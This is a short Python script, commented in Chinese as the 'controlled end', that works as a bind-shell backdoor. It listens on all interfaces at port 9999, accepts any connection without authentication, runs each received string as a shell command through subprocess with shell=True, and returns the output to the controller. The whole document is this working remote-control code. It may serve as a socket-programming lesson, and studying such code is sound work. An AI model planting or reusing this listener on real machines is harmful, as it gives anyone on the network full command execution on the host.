#被控制端：利用socket实现数据通信，subprocess模块实现命令的执行

import socket
import sys
import subprocess
import time
import threading

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',9999))
s.listen(10)
print('Waiting for the connection...')

def sock_connect(sock,addr):
    print('New client %s:%s is connection!'% addr)
    sock.send(b'------------Welcome!----------------')
    while True:
        data = sock.recv(1024)
        data = data.decode('utf-8')
        #执行命令
        if data == 'exit':
            break
        else:
            comRst = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            m_stdout,m_stdeer = comRst.communicate()
            #将结果返回到服务器控制端
            sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8'))
            time.sleep(1)
    sock.close()

while True:
    sock,addr = s.accept()
    t = threading.Thread(target=sock_connect,args=(sock,addr))
    t.start()